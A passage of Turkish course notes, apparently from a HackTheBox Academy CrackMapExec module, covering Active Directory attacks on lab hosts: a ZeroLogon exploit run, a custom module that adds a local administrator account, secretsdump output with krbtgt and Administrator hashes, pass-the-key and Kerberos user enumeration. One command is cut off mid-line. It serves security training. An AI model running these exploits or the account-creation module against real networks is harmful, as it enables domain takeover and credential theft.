STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
DEBUG:root:Connected!
DEBUG Connected!
DEBUG:root:Binding to a8e0653c-2744-4389-a61d-7373df8b2292
DEBUG Binding to a8e0653c-2744-4389-a61d-7373df8b2292
DEBUG:root:Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG:root:Successfully bound!
DEBUG Successfully bound!
DEBUG:root:ipsc = False
DEBUG ipsc = False
DEBUG:root:Using the default IsPathSupported
DEBUG Using the default IsPathSupported
DEBUG:root:Sending IsPathSupported!
DEBUG Sending IsPathSupported!
DEBUG:root:Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG Something went wrong, check error status => SMB SessionError:
STATUS_INVALID_PARAMETER(An invalid parameter was passed to a service or
function.)
DEBUG:root:Attack may of may not have worked, check your listener...
DEBUG Attack may of may not have worked, check your listener...
DEBUG:root:Target not vulnerable to ShadowCoerce
DEBUG Target not vulnerable to ShadowCoerce
DEBUG:root:Stopped thread poller
DEBUG Stopped thread poller

```


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -M ms17-010

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)

```


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

```
git clone https://github.com/dirkjanm/CVE-2020-1472 -q

cd CVE-2020-1472/

proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3
Performing authentication attempts...
==========================================================================
==========================================================================
==========================================
==========================================================================
==========================================================================
==========
Target vulnerable, changing account password to empty string
Result: 0
Exploit complete!

```

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u 'DC01


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

```
wget "https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64" -O vscode.deb -q

sudo dpkg -i vscode.deb

Selecting previously unselected package code.
(Reading database ... 560441 files and directories currently installed.)
Preparing to unpack vscode.deb ...
Unpacking code (1.73.1-1667967334) ...
Setting up code (1.73.1-1667967334) ...
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for bamfdaemon (0.5.4-2) ...
Rebuilding /usr/share/applications/bamf-2.index...
Processing triggers for mailcap (3.69) ...
Processing triggers for shared-mime-info (2.0-1) ...

```

Daha sonra açmak için `code` yazabiliriz 

```
code
```

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*- 
# from .... import ....

class CMEModule:
    name = 'name_module'
    description = "description"
    supported_protocols = ['smb', 'mssql', 'etc']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        MYOPTION description
        MYOPTION2 description2
        '''
        # when the user is connected but not the admin of the target
        # user cannot execute a system command, but it can be useful for pass
        # policy, share, Kerberoastable accounts, etc.
    
    def on_login(self, context, connection):
        # when the user is connected and the admin of the target
        # user can execute a system command
        pass
    
    def on_admin_login(self, context, connection):
        # Example of executing a command
        # command = ''
        # context.log.info('Executing command')
        # p = connection.execute(command, True)
        # context.log.highlight(p)
        pass

```



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*- 
# from .... import ....

class CMEModule:
    '''
    Created to teach HackTheBox Academy students how to create a
    module for CrackMapExec
    Reference: https://academy.hackthebox.com/
    Module by @juliourena
    '''
    
    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER Choose a username for the administrator account. Default:
        plaintext
        PASS Choose a password for the administrator. Default:
        HackTheBoxCME1337!
        '''
        self.user = "plaintext"
        
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']
        
        self.password = "HackTheBoxCME1337!"
        
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        # Implement functionality here
        pass

```

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

```
def on_admin_login(self, context, connection):
    context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user, self.password))
    command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
    
    context.log.info('Executing command')
    p = connection.execute(command, True)
    context.log.highlight(p)

```


Son olarak, yeni modülümüz şu şekilde görünmelidir:

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
class CMEModule:
    '''
    Created to teach HackTheBox Academy students how to create a
    module for CrackMapExec
    Reference: https://academy.hackthebox.com/
    Module by @juliourena
    '''
    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER Choose a username for the administrator account. Default:
        plaintext
        PASS Choose a password for the administrator. Default:
        asdasd123
        '''
        self.user = "plaintext"
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']
        
        self.password = "asdasd123"
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user, self.password))
        command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
        
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.highlight(p)

```


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M createadmin

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121 445 DC01 [*] Creating user with
the following values: USER plaintext and PASS asdasd123
CREATEAD... 10.129.203.121 445 DC01 [*] Executing command
CREATEAD... 10.129.203.121 445 DC01 The command completed successfully.
The command completed successfully.
```

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M createadmin -o
USER=htb PASS=Newpassword!

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121 445 DC01 [*] Creating user with
the following values: USER htb and PASS Newpassword!
CREATEAD... 10.129.203.121 445 DC01 [*] Executing command
CREATEAD... 10.129.203.121 445 DC01 The command completed successfully.
The command completed successfully.
```


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

```
cat ~/.cme/cme.conf
[CME]
workspace = default
last_used_db = mssql
pwn3d_label = Pwn3d!
audit_mode = #
<SNIP>
```

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01!

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)

```

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

```
crackmapexec smb 10.129.203.121 -u robert -p robert_password.txt

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
```


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

```
crackmapexec smb 10.129.203.121 -u robert -p robert_password.txt -M
get_netconnections

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
GET_NETC... 10.129.203.121 445 MS01 [+] IP Address:
['172.16.1.5'] Search Domain: ['inlanefreight.htb', 'htb']
GET_NETC... 10.129.203.121 445 MS01 [+] IP Address:
['10.129.203.121', 'fe80::8c8a:5209:5876:537d',
'dead:beef::8c8a:5209:5876:537d', 'dead:beef::1e2'] Search Domain:
['inlanefreight.htb', 'htb']
GET_NETC... 10.129.203.121 445 MS01 [*] Saved raw output
to network-connections-10.129.203.121-2022-11-16_080253.log

```

Şimdi IPv6 üzerinden hedefe erişelim.

```
crackmapexec smb dead:beef::8c8a:5209:5876:537d -u robert -p
robert_password.txt -x "ipconfig"

SMB dead:beef::8c8a:5209:5876:537d 445 MS01 [*]
Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb)
(signing:False) (SMBv1:False)
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 [+]
Executed command
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Windows
IP Configuration
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Ethernet adapter Ethernet1:
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Connection-specific DNS Suffix . :
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv4
Address. . . . . . . . . . . : 172.16.1.5
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Subnet
Mask . . . . . . . . . . . : 255.255.255.0
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Default
Gateway . . . . . . . . . :
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Ethernet adapter Ethernet0 2:
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
Connection-specific DNS Suffix . : .htb
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv6
Address. . . . . . . . . . . : dead:beef::1e2
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv6
Address. . . . . . . . . . . : dead:beef::8c8a:5209:5876:537d
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Linklocal IPv6 Address . . . . . : fe80::8c8a:5209:5876:537d%13
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 IPv4
Address. . . . . . . . . . . : 10.129.203.121
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Subnet
Mask . . . . . . . . . . . : 255.255.0.0
SMB dead:beef::8c8a:5209:5876:537d 445 MS01 Default
Gateway . . . . . . . . . : fe80::250:56ff:feb9:b9fc%13
SMB dead:beef::8c8a:5209:5876:537d 445 MS01
10.129.0.1

```



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

```
crackmapexec smb 10.129.203.121 -u robert -p robert_password.txt --shares

SMB 10.129.203.121 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.203.121 445 MS01 [+]
inlanefreight.htb\robert:######## (Pwn3d!)
[*] completed: 100.00% (1/1)
SMB 10.129.203.121 445 MS01 [+] Enumerated shares
SMB 10.129.203.121 445 MS01 Share
Permissions Remark
SMB 10.129.203.121 445 MS01 ----- ------
----- ------
SMB 10.129.203.121 445 MS01 ADMIN$
READ,WRITE Remote Admin
SMB 10.129.203.121 445 MS01 C$
READ,WRITE Default share
SMB 10.129.203.121 445 MS01 CertEnroll
READ,WRITE Active Directory Certificate Services share
SMB 10.129.203.121 445 MS01 IPC$ READ
Remote IPC

```

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

```
echo -e "\n10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight
inlanefreight.htb" | sudo tee -a /etc/hosts

10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb
```

```
cat /etc/hosts
# Host addresses
127.0.0.1 localhost
127.0.1.1 cyberspace
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb
```

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

```
crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --kerberos -
-shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$ READ
Remote Admin
SMB 10.129.203.121 445 DC01 C$
READ,WRITE Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 D$
READ,WRITE Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
READ,WRITE
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON READ
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL READ
Logon server share

```




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

```
crackmapexec smb 10.129.203.121 -u account_not_exist julio robert -p
OtherPassword --kerberos

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\account_not_exist: KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\julio: KDC_ERR_PREAUTH_FAILED
SMB 10.129.203.121 445 DC01 [-]
inlanefreight.htb\robert account vulnerable to asreproast attack
```

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

```
secretsdump.py

INLANEFREIGHT.HTB/julio:[email protected]
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xbfb21eeffaaa8abaf5365adf6562a1a4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353b
e1c2c3c99:::
<SNIP>
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-
96:f535588e917cf644294519f345f5e14c852d6ae4d9c6fbfefc54be82b84bb35c
Administrator:aes128-cts-hmac-sha1-96:6a1b10171f2f12d7d6fbb31e1823617b
Administrator:des-cbc-md5:b38a08d637d9e06e
krbtgt:aes256-cts-hmac-sha1-
96:b67cba3eccadb27d482929f88ace038f9a5b73b6bbc3af93f40575cd6b5fb02c
krbtgt:aes128-cts-hmac-sha1-96:d6a6464fdf51d2bd587366254dcd34e7
krbtgt:des-cbc-md5:73f701bcf4d5d96e
inlanefreight.htb\julio:aes256-cts-hmac-sha1-
96:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76
inlanefreight.htb\julio:aes128-cts-hmac-sha1-
96:ae1b6f722a8857a60c781dd1c12dae4d
<SNIP>

```

```
crackmapexec smb 10.129.203.121 -u julio --aesKey
77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c49
6c577d10e4df76 (Pwn3d!)

```


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

```
getTGT.py inlanefreight.htb/robert:'Inlanefreight01!' -dc-ip
10.129.203.121

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Saving ticket in robert.ccache
```

```
export KRB5CCNAME=$(pwd)/robert.ccache
```

